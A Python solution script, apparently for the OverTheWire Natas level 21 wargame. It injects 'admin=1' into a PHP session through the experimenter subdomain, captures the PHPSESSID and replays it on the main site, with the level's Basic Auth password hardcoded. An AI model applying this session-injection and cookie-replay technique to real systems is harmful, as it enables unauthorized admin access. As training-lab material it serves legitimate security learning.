import requests
import re
from requests.auth import HTTPBasicAuth

with requests.Session() as session:
    r=session.post(url="http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas21", "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"), data={"submit":"negro", "admin":"1"})
    print (r.text)
    # print(r.cookies)

    sess=(re.search('PHPSESSID=([a-zA-Z0-9]{26})', str(r.cookies)).group(1))
    cookie={"PHPSESSID":str(sess)}
    ans=session.get(url="http://natas21.natas.labs.overthewire.org/?debug", auth=HTTPBasicAuth("natas21", "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"), cookies = cookie)
    print(ans.text)
    print(ans.cookies)
